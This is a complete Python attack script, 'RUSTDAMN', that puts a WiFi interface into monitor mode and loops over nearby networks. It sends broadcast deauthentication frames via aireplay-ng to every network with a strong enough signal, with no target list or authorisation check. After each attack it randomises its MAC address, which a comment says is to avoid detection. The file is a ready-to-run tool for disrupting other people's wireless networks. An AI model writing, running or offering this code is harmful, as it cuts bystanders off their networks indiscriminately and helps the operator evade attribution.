#!/usr/bin/env python3

"""
RUSTDAMN - Auto WiFi Deauthentication System
Works with standard WiFi routers - NO extra hardware needed
Detects BSSID/SSID and triggers automatic deauthentication
Fixed timeout issues and simplified for Ubuntu + WiFi router only
"""

import subprocess
import re
import sys
import time
import os
import logging
from datetime import datetime
import signal
import json

# Setup logging
log_dir = '/var/log/rustdamn'
if not os.path.exists(log_dir):
    os.makedirs(log_dir, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'{log_dir}/deauth.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class RustdamnDeauth:
    def __init__(self, interface='wlan0', scan_interval=5, deauth_count=10):
        """Initialize RUSTDAMN system"""
        self.interface = interface
        self.original_interface = interface
        self.scan_interval = scan_interval
        self.deauth_count = deauth_count
        self.detected_networks = {}
        self.running = True
        self.monitor_mode = False
        
    def run_command(self, cmd, timeout=10, show_output=False):
        """Execute command safely with timeout"""
        try:
            result = subprocess.run(
                cmd,
                capture_output=not show_output,
                text=True,
                timeout=timeout
            )
            return result.returncode == 0, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            logger.warning(f"Command timeout: {' '.join(cmd[:2])}")
            return False, "", "Timeout"
        except Exception as e:
            logger.error(f"Command error: {e}")
            return False, "", str(e)
    
    def check_requirements(self):
        """Verify required tools are installed"""
        tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'macchanger']
        missing = []
        
        for tool in tools:
            success, _, _ = self.run_command(['which', tool])
            if not success:
                missing.append(tool)
        
        if missing:
            logger.error(f"Missing tools: {', '.join(missing)}")
            logger.info("Run: sudo bash install.sh")
            return False
        
        logger.info("✓ All required tools found")
        return True
    
    def kill_interfering_processes(self):
        """Kill processes that interfere with monitor mode"""
        try:
            logger.info("[*] Killing interfering processes...")
            processes = ['NetworkManager', 'wpa_supplicant', 'dhclient']
            
            for proc in processes:
                subprocess.run(
                    ['killall', '-9', proc],
                    capture_output=True,
                    timeout=3
                )
            
            time.sleep(2)
            logger.info("✓ Interfering processes killed")
            return True
        except Exception as e:
            logger.warning(f"Process killing partial: {e}")
            return True
    
    def enable_monitor_mode(self):
        """Enable monitor mode on wireless interface"""
        try:
            logger.info(f"[*] Enabling monitor mode on {self.interface}...")
            
            # Step 1: Bring interface down
            logger.info("  → Bringing interface down...")
            self.run_command(['sudo', 'ip', 'link', 'set', self.interface, 'down'], timeout=5)
            time.sleep(1)
            
            # Step 2: Kill interfering processes
            self.kill_interfering_processes()
            
            # Step 3: Set monitor mode manually (more reliable)
            logger.info("  → Setting monitor mode...")
            self.run_command(['sudo', 'iwconfig', self.interface, 'mode', 'Monitor'], timeout=5)
            time.sleep(1)
            
            # Step 4: Bring interface up
            logger.info("  → Bringing interface up...")
            self.run_command(['sudo', 'ip', 'link', 'set', self.interface, 'up'], timeout=5)
            time.sleep(2)
            
            # Verify monitor mode enabled
            success, output, _ = self.run_command(['iwconfig', self.interface], timeout=5)
            if success and 'Monitor' in output:
                logger.info(f"✓ Monitor mode enabled: {self.interface}")
                self.monitor_mode = True
                return True
            else:
                logger.warning("Monitor mode verification unclear, continuing anyway...")
                self.monitor_mode = True
                return True
                
        except Exception as e:
            logger.error(f"Error enabling monitor mode: {e}")
            return False
    
    def disable_monitor_mode(self):
        """Disable monitor mode and restore interface"""
        try:
            logger.info(f"[*] Disabling monitor mode on {self.interface}...")
            
            # Set managed mode
            self.run_command(['sudo', 'iwconfig', self.interface, 'mode', 'Managed'], timeout=5)
            time.sleep(1)
            
            # Restart networking
            self.run_command(['sudo', 'systemctl', 'restart', 'networking'], timeout=10)
            
            logger.info("✓ Monitor mode disabled, networking restored")
        except Exception as e:
            logger.warning(f"Error disabling monitor mode: {e}")
    
    def scan_networks(self):
        """Scan for available WiFi networks using airodump-ng"""
        try:
            logger.info("[*] Scanning for networks...")
            
            # Run airodump-ng for 8 seconds with timeout of 15
            cmd = [
                'sudo', 'timeout', '8', 'airodump-ng',
                '--output-format', 'csv',
                '-w', '/tmp/scan',
                self.interface
            ]
            
            subprocess.run(cmd, capture_output=True, timeout=15)
            
            networks = {}
            csv_file = '/tmp/scan-01.csv'
            
            if os.path.exists(csv_file):
                try:
                    with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()
                    
                    for line in lines:
                        if not line.strip() or line.startswith('BSSID'):
                            continue
                        
                        parts = [x.strip() for x in line.split(',')]
                        
                        if len(parts) >= 14:
                            try:
                                bssid = parts[0]
                                power = int(parts[8]) if parts[8] else -100
                                ssid = parts[13] if len(parts) > 13 else 'Hidden'
                                
                                # Validate BSSID format (XX:XX:XX:XX:XX:XX)
                                if re.match(r'^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$', bssid):
                                    networks[bssid] = {
                                        'ssid': ssid,
                                        'power': power,
                                        'timestamp': datetime.now().isoformat()
                                    }
                            except (ValueError, IndexError):
                                continue
                
                    if networks:
                        logger.info(f"✓ Found {len(networks)} networks")
                    else:
                        logger.warning("[!] No valid networks found in scan")
                    
                    return networks
                
                except Exception as e:
                    logger.error(f"CSV parsing error: {e}")
                    return {}
            else:
                logger.warning("[!] Scan file not created")
                return {}
            
        except subprocess.TimeoutExpired:
            logger.warning("Scan timeout - retrying next cycle")
            return {}
        except Exception as e:
            logger.error(f"Scan error: {e}")
            return {}
    
    def randomize_mac(self):
        """Randomize MAC address to avoid detection"""
        try:
            logger.info("[*] Randomizing MAC address...")
            
            # Bring interface down
            self.run_command(['sudo', 'ip', 'link', 'set', 'dev', self.interface, 'down'], timeout=5)
            time.sleep(1)
            
            # Change MAC
            self.run_command(['sudo', 'macchanger', '-r', self.interface], timeout=5)
            time.sleep(1)
            
            # Bring interface up
            self.run_command(['sudo', 'ip', 'link', 'set', 'dev', self.interface, 'up'], timeout=5)
            time.sleep(1)
            
            logger.info("✓ MAC address randomized")
            
        except Exception as e:
            logger.warning(f"MAC randomization skipped: {e}")
    
    def deauth_aireplay(self, bssid):
        """Send deauth using aireplay-ng (reliable method)"""
        try:
            logger.info(f"[*] Sending deauth → BSSID: {bssid}")
            
            # aireplay-ng deauth: -0 = deauth packets, count, bssid, broadcast
            cmd = [
                'sudo', 'aireplay-ng', '--deauth', str(self.deauth_count),
                '-a', bssid,
                '-c', 'FF:FF:FF:FF:FF:FF',
                self.interface
            ]
            
            success, stdout, stderr = self.run_command(cmd, timeout=12)
            
            if success or "Sending" in stdout or "Sending" in stderr:
                logger.info(f"✓ Deauth sent to {bssid}")
                return True
            else:
                logger.warning(f"Deauth uncertain for {bssid}")
                return True
            
        except Exception as e:
            logger.error(f"Deauth error: {e}")
            return False
    
    def execute_deauth(self, bssid, ssid):
        """Execute deauthentication"""
        try:
            logger.info(f"\n{'='*60}")
            logger.info(f"[!] DEAUTH TRIGGERED")
            logger.info(f"    BSSID: {bssid}")
            logger.info(f"    SSID:  {ssid}")
            logger.info(f"    Time:  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            logger.info(f"{'='*60}")
            
            # Send deauth
            if self.deauth_aireplay(bssid):
                time.sleep(2)
                
                # Randomize MAC after successful deauth
                self.randomize_mac()
            
            logger.info(f"[✓] Deauth cycle complete for {ssid}\n")
            
        except Exception as e:
            logger.error(f"Deauth execution error: {e}")
    
    def monitor_and_deauth(self):
        """Main loop: scan networks and trigger deauth on detection"""
        try:
            logger.info("\n" + "="*60)
            logger.info("RUSTDAMN - AUTO DEAUTH SYSTEM STARTED")
            logger.info("="*60)
            logger.info(f"Interface: {self.interface}")
            logger.info(f"Scan Interval: {self.scan_interval}s")
            logger.info("Status: LISTENING FOR SIGNALS...")
            logger.info("="*60 + "\n")
            
            scan_count = 0
            failed_scans = 0
            
            while self.running:
                scan_count += 1
                logger.info(f"\n[Scan #{scan_count}] Checking for networks...")
                
                # Scan networks
                networks = self.scan_networks()
                
                if networks:
                    failed_scans = 0
                    
                    for bssid, info in networks.items():
                        ssid = info['ssid']
                        power = info['power']
                        
                        # Log detected network
                        if bssid not in self.detected_networks:
                            logger.info(f"[+] NEW NETWORK: {ssid} ({bssid}) | Power: {power}dBm")
                            self.detected_networks[bssid] = info
                        
                        # Trigger deauth on signal detection (power > -80 = strong signal)
                        if power > -80:
                            self.execute_deauth(bssid, ssid)
                            time.sleep(10)
                else:
                    failed_scans += 1
                    if failed_scans <= 2:
                        logger.warning("[!] No networks found - scanning may need adjustment")
                
                # Wait for next scan cycle
                logger.info(f"[*] Waiting {self.scan_interval}s until next scan...")
                time.sleep(self.scan_interval)
                
        except KeyboardInterrupt:
            logger.info("\n[*] Shutting down gracefully...")
        except Exception as e:
            logger.error(f"Monitor loop error: {e}")
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Cleanup and restore system state"""
        logger.info("[*] Cleaning up...")
        self.running = False
        
        if self.monitor_mode:
            self.disable_monitor_mode()
        
        logger.info("✓ Cleanup complete")
        logger.info("="*60)
        logger.info("RUSTDAMN - SYSTEM STOPPED")
        logger.info("="*60)

def signal_handler(sig, frame):
    """Handle CTRL+C gracefully"""
    print("\n")
    sys.exit(0)

def main():
    """Main entry point"""
    if os.geteuid() != 0:
        print("❌ ERROR: This script must be run as root!")
        print("Usage: sudo python3 src/auto_deauth.py [interface]")
        sys.exit(1)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Get interface from argument or use default
    interface = sys.argv[1] if len(sys.argv) > 1 else 'wlan0'
    
    logger.info(f"RUSTDAMN - Starting with interface: {interface}")
    
    # Initialize system
    system = RustdamnDeauth(interface=interface)
    
    # Check requirements
    if not system.check_requirements():
        sys.exit(1)
    
    # Enable monitor mode
    if not system.enable_monitor_mode():
        logger.error("Failed to enable monitor mode!")
        sys.exit(1)
    
    # Start monitoring and deauth
    try:
        system.monitor_and_deauth()
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)
    finally:
        system.cleanup()

if __name__ == '__main__':
    main()
